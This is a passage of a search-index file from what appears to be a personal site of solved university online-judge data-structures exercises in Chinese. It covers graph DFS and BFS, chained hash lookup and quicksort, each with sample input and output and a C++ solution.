\u7b2c\u4e8c\u884c\u8f93\u5165n\uff0c\u8868\u793a\u7b2c1\u4e2a\u56fe\u6709n\u4e2a\u7ed3\u70b9 \u7b2c\u4e09\u884c\u8d77\uff0c\u6bcf\u884c\u8f93\u5165\u90bb\u63a5\u77e9\u9635\u7684\u4e00\u884c\uff0c\u4ee5\u6b64\u7c7b\u63a8\u8f93\u5165n\u884c \u7b2ci\u4e2a\u7ed3\u70b9\u4e0e\u5176\u4ed6\u7ed3\u70b9\u5982\u679c\u76f8\u8fde\u5219\u4e3a1\uff0c\u65e0\u8fde\u63a5\u5219\u4e3a0\uff0c\u6570\u636e\u4e4b\u95f4\u7528\u7a7a\u683c\u9694\u5f00 \u4ee5\u6b64\u7c7b\u63a8\u8f93\u5165\u4e0b\u4e00\u4e2a\u793a\u4f8b \u8f93\u51fa \u6bcf\u884c\u8f93\u51fa\u4e00\u4e2a\u56fe\u7684\u6df1\u5ea6\u4f18\u5148\u641c\u7d22\u7ed3\u679c\uff0c\u7ed3\u70b9\u7f16\u53f7\u4e4b\u95f4\u7528\u7a7a\u683c\u9694\u5f00 \u6837\u4f8b\u8f93\u5165 1 2 3 4 5 6 7 8 9 10 11 12 2 4 0 0 1 1 0 0 1 1 1 1 0 1 1 1 1 0 5 0 0 0 1 1 0 0 1 0 0 0 1 0 1 1 1 0 1 0 0 1 0 1 0 0 \u6837\u4f8b\u8f93\u51fa 1 2 0 2 1 3 0 3 2 1 4 \u63d0\u793a \u89e3\u51b3\u65b9\u6848 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 #include <iostream> #include <vector> class Map { public : Map ( int size ) : size ( size ), matrix ( size , std :: vector < int > ( size , 0 )) {} void setMatrixFromCin () { for ( int ir = 0 ; ir < matrix . size (); ++ ir ) { for ( int ic = 0 ; ic < matrix . size (); ++ ic ) { std :: cin >> matrix [ ir ][ ic ]; } } } void dfs () { visited = std :: vector < bool > ( size , false ); for ( int i = 0 ; i < visited . size (); ++ i ) { if ( visited [ i ] == false ) { dfs ( i ); } } std :: cout << std :: endl ; } private : int size ; std :: vector < std :: vector < int > > matrix ; std :: vector < bool > visited ; void dfs ( int vertex ) { visited [ vertex ] = true ; std :: cout << vertex << ' ' ; for ( int i = 0 ; i < matrix . size (); ++ i ) { if ( matrix [ vertex ][ i ] == 1 && visited [ i ] == false ) { dfs ( i ); } } } }; int main () { int ctrl ; std :: cin >> ctrl ; while ( ctrl -- ) { int size ; std :: cin >> size ; Map map ( size ); map . setMatrixFromCin (); map . dfs (); } return 0 ; }","title":"DS\u56fe\u904d\u5386--\u6df1\u5ea6\u4f18\u5148\u641c\u7d22"},{"location":"szu_oj/ds/1223/#ds-","text":"\u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB","title":"DS\u56fe\u904d\u5386--\u6df1\u5ea6\u4f18\u5148\u641c\u7d22"},{"location":"szu_oj/ds/1223/#_1","text":"\u7ed9\u51fa\u4e00\u4e2a\u56fe\u7684\u90bb\u63a5\u77e9\u9635\uff0c\u5bf9\u56fe\u8fdb\u884c\u6df1\u5ea6\u4f18\u5148\u641c\u7d22\uff0c\u4ece\u9876\u70b90\u5f00\u59cb \u6ce8\u610f\uff1a\u56fen\u4e2a\u9876\u70b9\u7f16\u53f7\u4ece0\u5230n-1 \u4ee3\u7801\u6846\u67b6\u5982\u4e0b\uff1a","title":"\u9898\u76ee\u63cf\u8ff0"},{"location":"szu_oj/ds/1223/#_2","text":"\u7b2c\u4e00\u884c\u8f93\u5165t\uff0c\u8868\u793a\u6709t\u4e2a\u6d4b\u8bd5\u5b9e\u4f8b \u7b2c\u4e8c\u884c\u8f93\u5165n\uff0c\u8868\u793a\u7b2c1\u4e2a\u56fe\u6709n\u4e2a\u7ed3\u70b9 \u7b2c\u4e09\u884c\u8d77\uff0c\u6bcf\u884c\u8f93\u5165\u90bb\u63a5\u77e9\u9635\u7684\u4e00\u884c\uff0c\u4ee5\u6b64\u7c7b\u63a8\u8f93\u5165n\u884c \u7b2ci\u4e2a\u7ed3\u70b9\u4e0e\u5176\u4ed6\u7ed3\u70b9\u5982\u679c\u76f8\u8fde\u5219\u4e3a1\uff0c\u65e0\u8fde\u63a5\u5219\u4e3a0\uff0c\u6570\u636e\u4e4b\u95f4\u7528\u7a7a\u683c\u9694\u5f00 \u4ee5\u6b64\u7c7b\u63a8\u8f93\u5165\u4e0b\u4e00\u4e2a\u793a\u4f8b","title":"\u8f93\u5165"},{"location":"szu_oj/ds/1223/#_3","text":"\u6bcf\u884c\u8f93\u51fa\u4e00\u4e2a\u56fe\u7684\u6df1\u5ea6\u4f18\u5148\u641c\u7d22\u7ed3\u679c\uff0c\u7ed3\u70b9\u7f16\u53f7\u4e4b\u95f4\u7528\u7a7a\u683c\u9694\u5f00","title":"\u8f93\u51fa"},{"location":"szu_oj/ds/1223/#_4","text":"1 2 3 4 5 6 7 8 9 10 11 12 2 4 0 0 1 1 0 0 1 1 1 1 0 1 1 1 1 0 5 0 0 0 1 1 0 0 1 0 0 0 1 0 1 1 1 0 1 0 0 1 0 1 0 0","title":"\u6837\u4f8b\u8f93\u5165"},{"location":"szu_oj/ds/1223/#_5","text":"1 2 0 2 1 3 0 3 2 1 4","title":"\u6837\u4f8b\u8f93\u51fa"},{"location":"szu_oj/ds/1223/#_6","text":"","title":"\u63d0\u793a"},{"location":"szu_oj/ds/1223/#_7","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 #include <iostream> #include <vector> class Map { public : Map ( int size ) : size ( size ), matrix ( size , std :: vector < int > ( size , 0 )) {} void setMatrixFromCin () { for ( int ir = 0 ; ir < matrix . size (); ++ ir ) { for ( int ic = 0 ; ic < matrix . size (); ++ ic ) { std :: cin >> matrix [ ir ][ ic ]; } } } void dfs () { visited = std :: vector < bool > ( size , false ); for ( int i = 0 ; i < visited . size (); ++ i ) { if ( visited [ i ] == false ) { dfs ( i ); } } std :: cout << std :: endl ; } private : int size ; std :: vector < std :: vector < int > > matrix ; std :: vector < bool > visited ; void dfs ( int vertex ) { visited [ vertex ] = true ; std :: cout << vertex << ' ' ; for ( int i = 0 ; i < matrix . size (); ++ i ) { if ( matrix [ vertex ][ i ] == 1 && visited [ i ] == false ) { dfs ( i ); } } } }; int main () { int ctrl ; std :: cin >> ctrl ; while ( ctrl -- ) { int size ; std :: cin >> size ; Map map ( size ); map . setMatrixFromCin (); map . dfs (); } return 0 ; }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"szu_oj/ds/1224/","text":"DS\u56fe\u904d\u5386--\u5e7f\u5ea6\u4f18\u5148\u641c\u7d22 \u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB \u9898\u76ee\u63cf\u8ff0 \u7ed9\u51fa\u4e00\u4e2a\u56fe\u7684\u90bb\u63a5\u77e9\u9635\uff0c\u5bf9\u56fe\u8fdb\u884c\u6df1\u5ea6\u4f18\u5148\u641c\u7d22\uff0c\u4ece\u9876\u70b90\u5f00\u59cb \u6ce8\u610f\uff1a\u56fen\u4e2a\u9876\u70b9\u7f16\u53f7\u4ece0\u5230n-1 \u4ee3\u7801\u6846\u67b6\u5982\u4e0b\uff1a \u8f93\u5165 \u7b2c\u4e00\u884c\u8f93\u5165t\uff0c\u8868\u793a\u6709t\u4e2a\u6d4b\u8bd5\u5b9e\u4f8b \u7b2c\u4e8c\u884c\u8f93\u5165n\uff0c\u8868\u793a\u7b2c1\u4e2a\u56fe\u6709n\u4e2a\u7ed3\u70b9 \u7b2c\u4e09\u884c\u8d77\uff0c\u6bcf\u884c\u8f93\u5165\u90bb\u63a5\u77e9\u9635\u7684\u4e00\u884c\uff0c\u4ee5\u6b64\u7c7b\u63a8\u8f93\u5165n\u884c \u7b2ci\u4e2a\u7ed3\u70b9\u4e0e\u5176\u4ed6\u7ed3\u70b9\u5982\u679c\u76f8\u8fde\u5219\u4e3a1\uff0c\u65e0\u8fde\u63a5\u5219\u4e3a0\uff0c\u6570\u636e\u4e4b\u95f4\u7528\u7a7a\u683c\u9694\u5f00 \u4ee5\u6b64\u7c7b\u63a8\u8f93\u5165\u4e0b\u4e00\u4e2a\u793a\u4f8b \u8f93\u51fa \u6bcf\u884c\u8f93\u51fa\u4e00\u4e2a\u56fe\u7684\u5e7f\u5ea6\u4f18\u5148\u641c\u7d22\u7ed3\u679c\uff0c\u7ed3\u70b9\u7f16\u53f7\u4e4b\u95f4\u7528\u7a7a\u683c\u9694\u5f00 \u6837\u4f8b\u8f93\u5165 1 2 3 4 5 6 7 8 9 10 11 12 2 4 0 0 1 1 0 0 1 1 1 1 0 1 1 1 1 0 5 0 0 0 1 1 0 0 1 0 0 0 1 0 1 1 1 0 1 0 0 1 0 1 0 0 \u6837\u4f8b\u8f93\u51fa 1 2 0 2 3 1 0 3 4 2 1 \u63d0\u793a \u89e3\u51b3\u65b9\u6848 \u66f4\u65b0\uff1a\u67d0\u5929\u731b\u7136\u53d1\u73b0\u8fd9\u91cc\u5199\u4e86\u597d\u591a\u5e9f\u8bdd...\u6709\u7a7a\u518d\u6539\u5427... 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 #include <iostream> #include <vector> #include <queue> class Map { public : Map ( int size ) : size ( size ), matrix ( size , std :: vector < int > ( size , 0 )) {} void setMatrixFromCin () { for ( int ir = 0 ; ir < matrix . size (); ++ ir ) { for ( int ic = 0 ; ic < matrix . size (); ++ ic ) { std :: cin >> matrix [ ir ][ ic ]; } } } void bfs () { visited = std :: vector < bool > ( size , false ); for ( int i = 0 ; i < visited . size (); ++ i ) { if ( visited [ i ] == false ) { bfs ( i ); } } std :: cout << std :: endl ; } private : int size ; std :: vector < std :: vector < int > > matrix ; std :: vector < bool > visited ; void bfs ( int vertex ) { std :: queue < int > queue ; for ( int i = 0 ; i < matrix . size (); ++ i ) { if ( visited [ i ] == false ) { visited [ i ] = true ; std :: cout << i << ' ' ; queue . push ( i ); while ( ! queue . empty ()) { i = queue . front (); queue . pop (); for ( int id = 0 ; id < matrix . size (); ++ id ) { if ( matrix [ i ][ id ] == 1 && visited [ id ] == false ) { visited [ id ] = true ; std :: cout << id << ' ' ; queue . push ( id ); } } } } } } }; int main () { int ctrl ; std :: cin >> ctrl ; while ( ctrl -- ) { int size ; std :: cin >> size ; Map map ( size ); map . setMatrixFromCin (); map . bfs (); } return 0 ; }","title":"DS\u56fe\u904d\u5386--\u5e7f\u5ea6\u4f18\u5148\u641c\u7d22"},{"location":"szu_oj/ds/1224/#ds-","text":"\u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB","title":"DS\u56fe\u904d\u5386--\u5e7f\u5ea6\u4f18\u5148\u641c\u7d22"},{"location":"szu_oj/ds/1224/#_1","text":"\u7ed9\u51fa\u4e00\u4e2a\u56fe\u7684\u90bb\u63a5\u77e9\u9635\uff0c\u5bf9\u56fe\u8fdb\u884c\u6df1\u5ea6\u4f18\u5148\u641c\u7d22\uff0c\u4ece\u9876\u70b90\u5f00\u59cb \u6ce8\u610f\uff1a\u56fen\u4e2a\u9876\u70b9\u7f16\u53f7\u4ece0\u5230n-1 \u4ee3\u7801\u6846\u67b6\u5982\u4e0b\uff1a","title":"\u9898\u76ee\u63cf\u8ff0"},{"location":"szu_oj/ds/1224/#_2","text":"\u7b2c\u4e00\u884c\u8f93\u5165t\uff0c\u8868\u793a\u6709t\u4e2a\u6d4b\u8bd5\u5b9e\u4f8b \u7b2c\u4e8c\u884c\u8f93\u5165n\uff0c\u8868\u793a\u7b2c1\u4e2a\u56fe\u6709n\u4e2a\u7ed3\u70b9 \u7b2c\u4e09\u884c\u8d77\uff0c\u6bcf\u884c\u8f93\u5165\u90bb\u63a5\u77e9\u9635\u7684\u4e00\u884c\uff0c\u4ee5\u6b64\u7c7b\u63a8\u8f93\u5165n\u884c \u7b2ci\u4e2a\u7ed3\u70b9\u4e0e\u5176\u4ed6\u7ed3\u70b9\u5982\u679c\u76f8\u8fde\u5219\u4e3a1\uff0c\u65e0\u8fde\u63a5\u5219\u4e3a0\uff0c\u6570\u636e\u4e4b\u95f4\u7528\u7a7a\u683c\u9694\u5f00 \u4ee5\u6b64\u7c7b\u63a8\u8f93\u5165\u4e0b\u4e00\u4e2a\u793a\u4f8b","title":"\u8f93\u5165"},{"location":"szu_oj/ds/1224/#_3","text":"\u6bcf\u884c\u8f93\u51fa\u4e00\u4e2a\u56fe\u7684\u5e7f\u5ea6\u4f18\u5148\u641c\u7d22\u7ed3\u679c\uff0c\u7ed3\u70b9\u7f16\u53f7\u4e4b\u95f4\u7528\u7a7a\u683c\u9694\u5f00","title":"\u8f93\u51fa"},{"location":"szu_oj/ds/1224/#_4","text":"1 2 3 4 5 6 7 8 9 10 11 12 2 4 0 0 1 1 0 0 1 1 1 1 0 1 1 1 1 0 5 0 0 0 1 1 0 0 1 0 0 0 1 0 1 1 1 0 1 0 0 1 0 1 0 0","title":"\u6837\u4f8b\u8f93\u5165"},{"location":"szu_oj/ds/1224/#_5","text":"1 2 0 2 3 1 0 3 4 2 1","title":"\u6837\u4f8b\u8f93\u51fa"},{"location":"szu_oj/ds/1224/#_6","text":"","title":"\u63d0\u793a"},{"location":"szu_oj/ds/1224/#_7","text":"\u66f4\u65b0\uff1a\u67d0\u5929\u731b\u7136\u53d1\u73b0\u8fd9\u91cc\u5199\u4e86\u597d\u591a\u5e9f\u8bdd...\u6709\u7a7a\u518d\u6539\u5427... 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 #include <iostream> #include <vector> #include <queue> class Map { public : Map ( int size ) : size ( size ), matrix ( size , std :: vector < int > ( size , 0 )) {} void setMatrixFromCin () { for ( int ir = 0 ; ir < matrix . size (); ++ ir ) { for ( int ic = 0 ; ic < matrix . size (); ++ ic ) { std :: cin >> matrix [ ir ][ ic ]; } } } void bfs () { visited = std :: vector < bool > ( size , false ); for ( int i = 0 ; i < visited . size (); ++ i ) { if ( visited [ i ] == false ) { bfs ( i ); } } std :: cout << std :: endl ; } private : int size ; std :: vector < std :: vector < int > > matrix ; std :: vector < bool > visited ; void bfs ( int vertex ) { std :: queue < int > queue ; for ( int i = 0 ; i < matrix . size (); ++ i ) { if ( visited [ i ] == false ) { visited [ i ] = true ; std :: cout << i << ' ' ; queue . push ( i ); while ( ! queue . empty ()) { i = queue . front (); queue . pop (); for ( int id = 0 ; id < matrix . size (); ++ id ) { if ( matrix [ i ][ id ] == 1 && visited [ id ] == false ) { visited [ id ] = true ; std :: cout << id << ' ' ; queue . push ( id ); } } } } } } }; int main () { int ctrl ; std :: cin >> ctrl ; while ( ctrl -- ) { int size ; std :: cin >> size ; Map map ( size ); map . setMatrixFromCin (); map . bfs (); } return 0 ; }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"szu_oj/ds/1239/","text":"DS\u54c8\u5e0c\u67e5\u627e--\u94fe\u5730\u5740\u6cd5 \u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB \u9898\u76ee\u63cf\u8ff0 \u7ed9\u51fa\u4e00\u4e2a\u6570\u636e\u5e8f\u5217\uff0c\u5efa\u7acb\u54c8\u5e0c\u8868\uff0c\u91c7\u7528\u6c42\u4f59\u6cd5\u4f5c\u4e3a\u54c8\u5e0c\u51fd\u6570\uff0c\u6a21\u6570\u4e3a11\uff0c\u54c8\u5e0c\u51b2\u7a81\u7528\u94fe\u5730\u5740\u6cd5\u548c\u8868\u5934\u63d2\u5165 \u5982\u679c\u9996\u6b21\u67e5\u627e\u5931\u8d25\uff0c\u5c31\u628a\u6570\u636e\u63d2\u5165\u5230\u76f8\u5e94\u7684\u4f4d\u7f6e\u4e2d \u5b9e\u73b0\u54c8\u5e0c\u67e5\u627e\u529f\u80fd \u8f93\u5165 \u7b2c\u4e00\u884c\u8f93\u5165n\uff0c\u8868\u793a\u6709n\u4e2a\u6570\u636e \u7b2c\u4e8c\u884c\u8f93\u5165n\u4e2a\u6570\u636e\uff0c\u90fd\u662f\u81ea\u7136\u6570\u4e14\u4e92\u4e0d\u76f8\u540c\uff0c\u6570\u636e\u4e4b\u95f4\u7528\u7a7a\u683c\u9694\u5f00 \u7b2c\u4e09\u884c\u8f93\u5165t\uff0c\u8868\u793a\u8981\u67e5\u627et\u4e2a\u6570\u636e \u4ece\u7b2c\u56db\u884c\u8d77\uff0c\u6bcf\u884c\u8f93\u5165\u4e00\u4e2a\u8981\u67e5\u627e\u7684\u6570\u636e\uff0c\u90fd\u662f\u6b63\u6574\u6570 \u8f93\u51fa \u6bcf\u884c\u8f93\u51fa\u5bf9\u5e94\u6570\u636e\u7684\u67e5\u627e\u7ed3\u679c \u6837\u4f8b\u8f93\u5165 1 2 3 4 5 6 7 8 9 6 11 23 39 48 75 62 6 39 52 52 63 63 52 \u6837\u4f8b\u8f93\u51fa 1 2 3 4 5 6 6 1 error 8 1 error 8 1 8 2 \u63d0\u793a \u6ce8\u610f\uff0c\u5f53\u4e24\u6b21\u8f93\u5165\u8981\u76f8\u540c\u7684\u67e5\u627e\u6570\u636e\uff0c\u5982\u679c\u7b2c\u4e00\u6b21\u67e5\u627e\u4e0d\u6210\u529f\u5c31\u4f1a\u6267\u884c\u63d2\u5165\uff0c\u90a3\u4e48\u7b2c\u4e8c\u6b21\u67e5\u627e\u5fc5\u7136\u6210\u529f\uff0c\u4e14\u67e5\u627e\u6b21\u6570\u4e3a1\u6b21\uff08\u56e0\u4e3a\u505a\u8868\u5934\u63d2\u5165\uff09 \u4f8b\u5982\u793a\u4f8b\u6570\u636e\u4e2d\u8f93\u5165\u4e24\u6b2152\uff0c\u7b2c\u4e00\u6b21\u67e5\u627e\u5931\u8d25\u5c31\u628a52\u63d2\u5165\u5230\u4f4d\u7f6e8\uff0c\u7b2c\u4e8c\u6b21\u67e5\u627e\u5c31\u6210\u529f\u4e86\uff0c\u6240\u4ee5\u7b2c\u4e00\u6b21\u8f93\u51faerror\uff0c\u7b2c\u4e8c\u6b21\u5c31\u8f93\u51fa8 1 \u4e3a\u4ec0\u4e48\u7b2c\u4e09\u6b21\u8f93\u516552\u4f1a\u8f93\u51fa8 2 63\u63d2\u5165\u4e8e52\u524d \u89e3\u51b3\u65b9\u6848 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 #include <iostream> #include <vector> struct Node { int data ; Node * next ; Node () : data (), next ( NULL ) {} }; class HashTable { public : HashTable () : hash_ ( P ) {} void insert ( int data ) { int index = data % P ; Node * node = new Node (); node -> data = data ; node -> next = hash_ [ index ]. next ; hash_ [ index ]. next = node ; } void searchOrInsertThenPrint ( int data ) { int result = search ( data ); if ( result == - 1 ) { std :: cout << \"error\" << std :: endl ; insert ( data ); } else { std :: cout << data % P << ' ' << result << std :: endl ; } } int search ( int data ) { int index = data % P ; Node * ptr = & hash_ [ index ]; int count = 0 ; while ( ptr -> next != NULL ) { ptr = ptr -> next ; count += 1 ; if ( ptr -> data == data ) { return count ; } } return - 1 ; } private : static const int P = 11 ; std :: vector < Node > hash_ ; }; int main () { size_t size ; std :: cin >> size ; class HashTable hashTable ; for ( int i = 0 ; i < size ; ++ i ) { int number ; std :: cin >> number ; hashTable . insert ( number ); } size_t time ; std :: cin >> time ; for ( int i = 0 ; i < time ; ++ i ) { int number ; std :: cin >> number ; hashTable . searchOrInsertThenPrint ( number ); } return 0 ; }","title":"DS\u54c8\u5e0c\u67e5\u627e--\u94fe\u5730\u5740\u6cd5"},{"location":"szu_oj/ds/1239/#ds-","text":"\u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB","title":"DS\u54c8\u5e0c\u67e5\u627e--\u94fe\u5730\u5740\u6cd5"},{"location":"szu_oj/ds/1239/#_1","text":"\u7ed9\u51fa\u4e00\u4e2a\u6570\u636e\u5e8f\u5217\uff0c\u5efa\u7acb\u54c8\u5e0c\u8868\uff0c\u91c7\u7528\u6c42\u4f59\u6cd5\u4f5c\u4e3a\u54c8\u5e0c\u51fd\u6570\uff0c\u6a21\u6570\u4e3a11\uff0c\u54c8\u5e0c\u51b2\u7a81\u7528\u94fe\u5730\u5740\u6cd5\u548c\u8868\u5934\u63d2\u5165 \u5982\u679c\u9996\u6b21\u67e5\u627e\u5931\u8d25\uff0c\u5c31\u628a\u6570\u636e\u63d2\u5165\u5230\u76f8\u5e94\u7684\u4f4d\u7f6e\u4e2d \u5b9e\u73b0\u54c8\u5e0c\u67e5\u627e\u529f\u80fd","title":"\u9898\u76ee\u63cf\u8ff0"},{"location":"szu_oj/ds/1239/#_2","text":"\u7b2c\u4e00\u884c\u8f93\u5165n\uff0c\u8868\u793a\u6709n\u4e2a\u6570\u636e \u7b2c\u4e8c\u884c\u8f93\u5165n\u4e2a\u6570\u636e\uff0c\u90fd\u662f\u81ea\u7136\u6570\u4e14\u4e92\u4e0d\u76f8\u540c\uff0c\u6570\u636e\u4e4b\u95f4\u7528\u7a7a\u683c\u9694\u5f00 \u7b2c\u4e09\u884c\u8f93\u5165t\uff0c\u8868\u793a\u8981\u67e5\u627et\u4e2a\u6570\u636e \u4ece\u7b2c\u56db\u884c\u8d77\uff0c\u6bcf\u884c\u8f93\u5165\u4e00\u4e2a\u8981\u67e5\u627e\u7684\u6570\u636e\uff0c\u90fd\u662f\u6b63\u6574\u6570","title":"\u8f93\u5165"},{"location":"szu_oj/ds/1239/#_3","text":"\u6bcf\u884c\u8f93\u51fa\u5bf9\u5e94\u6570\u636e\u7684\u67e5\u627e\u7ed3\u679c","title":"\u8f93\u51fa"},{"location":"szu_oj/ds/1239/#_4","text":"1 2 3 4 5 6 7 8 9 6 11 23 39 48 75 62 6 39 52 52 63 63 52","title":"\u6837\u4f8b\u8f93\u5165"},{"location":"szu_oj/ds/1239/#_5","text":"1 2 3 4 5 6 6 1 error 8 1 error 8 1 8 2","title":"\u6837\u4f8b\u8f93\u51fa"},{"location":"szu_oj/ds/1239/#_6","text":"\u6ce8\u610f\uff0c\u5f53\u4e24\u6b21\u8f93\u5165\u8981\u76f8\u540c\u7684\u67e5\u627e\u6570\u636e\uff0c\u5982\u679c\u7b2c\u4e00\u6b21\u67e5\u627e\u4e0d\u6210\u529f\u5c31\u4f1a\u6267\u884c\u63d2\u5165\uff0c\u90a3\u4e48\u7b2c\u4e8c\u6b21\u67e5\u627e\u5fc5\u7136\u6210\u529f\uff0c\u4e14\u67e5\u627e\u6b21\u6570\u4e3a1\u6b21\uff08\u56e0\u4e3a\u505a\u8868\u5934\u63d2\u5165\uff09 \u4f8b\u5982\u793a\u4f8b\u6570\u636e\u4e2d\u8f93\u5165\u4e24\u6b2152\uff0c\u7b2c\u4e00\u6b21\u67e5\u627e\u5931\u8d25\u5c31\u628a52\u63d2\u5165\u5230\u4f4d\u7f6e8\uff0c\u7b2c\u4e8c\u6b21\u67e5\u627e\u5c31\u6210\u529f\u4e86\uff0c\u6240\u4ee5\u7b2c\u4e00\u6b21\u8f93\u51faerror\uff0c\u7b2c\u4e8c\u6b21\u5c31\u8f93\u51fa8 1 \u4e3a\u4ec0\u4e48\u7b2c\u4e09\u6b21\u8f93\u516552\u4f1a\u8f93\u51fa8 2 63\u63d2\u5165\u4e8e52\u524d","title":"\u63d0\u793a"},{"location":"szu_oj/ds/1239/#_7","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 #include <iostream> #include <vector> struct Node { int data ; Node * next ; Node () : data (), next ( NULL ) {} }; class HashTable { public : HashTable () : hash_ ( P ) {} void insert ( int data ) { int index = data % P ; Node * node = new Node (); node -> data = data ; node -> next = hash_ [ index ]. next ; hash_ [ index ]. next = node ; } void searchOrInsertThenPrint ( int data ) { int result = search ( data ); if ( result == - 1 ) { std :: cout << \"error\" << std :: endl ; insert ( data ); } else { std :: cout << data % P << ' ' << result << std :: endl ; } } int search ( int data ) { int index = data % P ; Node * ptr = & hash_ [ index ]; int count = 0 ; while ( ptr -> next != NULL ) { ptr = ptr -> next ; count += 1 ; if ( ptr -> data == data ) { return count ; } } return - 1 ; } private : static const int P = 11 ; std :: vector < Node > hash_ ; }; int main () { size_t size ; std :: cin >> size ; class HashTable hashTable ; for ( int i = 0 ; i < size ; ++ i ) { int number ; std :: cin >> number ; hashTable . insert ( number ); } size_t time ; std :: cin >> time ; for ( int i = 0 ; i < time ; ++ i ) { int number ; std :: cin >> number ; hashTable . searchOrInsertThenPrint ( number ); } return 0 ; }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"szu_oj/ds/1241/","text":"DS\u6392\u5e8f--\u5feb\u901f\u6392\u5e8f \u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB \u9898\u76ee\u63cf\u8ff0 \u7ed9\u51fa\u4e00\u4e2a\u6570\u636e\u5e8f\u5217\uff0c\u4f7f\u7528\u5feb\u901f\u6392\u5e8f\u7b97\u6cd5\u8fdb\u884c\u4ece\u5c0f\u5230\u5927\u7684\u6392\u5e8f --\u7a0b\u5e8f\u8981\u6c42-- \u82e5\u4f7f\u7528C++\u53ea\u80fdinclude\u4e00\u4e2a\u5934\u6587\u4ef6iostream\uff1b\u82e5\u4f7f\u7528C\u8bed\u8a00\u53ea\u80fdinclude\u4e00\u4e2a\u5934\u6587\u4ef6stdio \u7a0b\u5e8f\u4e2d\u82e5include\u591a\u8fc7\u4e00\u4e2a\u5934\u6587\u4ef6\uff0c\u4e0d\u770b\u4ee3\u7801\uff0c\u4f5c0\u5206\u5904\u7406 \u4e0d\u5141\u8bb8\u4f7f\u7528\u7b2c\u4e09\u65b9\u5bf9\u8c61\u6216\u51fd\u6570\u5b9e\u73b0\u672c\u9898\u7684\u8981\u6c42 \u8f93\u5165 \u7b2c\u4e00\u884c\u8f93\u5165t\uff0c\u8868\u793a\u6709t\u4e2a\u6d4b\u8bd5\u793a\u4f8b \u7b2c\u4e8c\u884c\u8f93\u5165n\uff0c\u8868\u793a\u7b2c\u4e00\u4e2a\u793a\u4f8b\u6709n\u4e2a\u6570\u636e \u7b2c\u4e09\u884c\u8f93\u5165n\u4e2a\u6570\u636e\uff0c\u90fd\u662f\u6b63\u6574\u6570\uff0c\u6570\u636e\u4e4b\u95f4\u7528\u7a7a\u683c\u9694\u5f00 \u4ee5\u6b64\u7c7b\u63a8 \u8f93\u51fa \u6bcf\u7ec4\u6d4b\u8bd5\u6570\u636e\uff0c\u8f93\u51fa\u6bcf\u8d9f\u5feb\u6392\u7684\u7ed3\u679c\uff0c\u5373\u6bcf\u6b21\u6392\u597d\u4e00\u4e2a\u6570\u5b57\u7ed3\u679c\uff08\u957f\u5ea6\u4e3a1\u7684\u5b50\u5e8f\u5217\uff0c\u4e0d\u7528\u6392\uff0c\u4e0d\u7528\u8f93\u51fa\uff09\u3002\u4e0d\u540c\u6d4b\u8bd5\u6570\u636e\u95f4\u7528\u7a7a\u884c\u5206\u9694\u3002 \u6837\u4f8b\u8f93\u5165 1 2 3 4 5 2 6 111 22 6 444 333 55 8 77 555 33 1 444 77 666 2222 \u6837\u4f8b\u8f93\u51fa 1 2 3 4 5 6 7 8 9 10 55 22 6 111 333 444 6 22 55 111 333 444 6 22 55 111 333 444 6 22 55 111 333 444 1 33 77 555 444 77 666 2222 1 33 77 555 444 77 666 2222 1 33 77 77 444 555 666 2222 1 33 77 77 444 555 666 2222 1 33 77 77 444 555 666 2222 \u63d0\u793a \u89e3\u51b3\u65b9\u6848 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 #include <iostream> #include <vector> void quickSort ( std :: vector < int > & vector , int begin , int end ); int partition ( std :: vector < int > & vector , int begin , int end ); int main () { int ctrl ; std :: cin >> ctrl ; while ( ctrl -- ) { int size ; std :: cin >> size ; std :: vector < int > vector ( static_cast < size_t > ( size )); for ( int i = 0 ; i < size ; ++ i ) { std :: cin >> vector [ i ]; } quickSort ( vector , 0 , static_cast < int > ( vector . size () - 1 )); std :: cout << std :: endl ; } return 0 ; } void quickSort ( std :: vector < int > & vector , int begin , int end ) { if ( begin < end ) { int pivot = partition ( vector , begin , end ); std :: cout << vector . front (); for ( int i = 1 ; i < vector . size (); ++ i ) { std :: cout << ' ' << vector [ i ]; } std :: cout << std :: endl ; quickSort ( vector , begin , pivot - 1 ); quickSort ( vector , pivot + 1 , end ); } } int partition ( std :: vector < int > & vector , int begin , int end ) { int key = vector [ begin ]; while ( begin < end ) { while ( begin < end && vector [ end ] >= key ) { end -= 1 ; } std :: swap ( vector [ begin ], vector [ end ]); while ( begin < end && vector [ begin 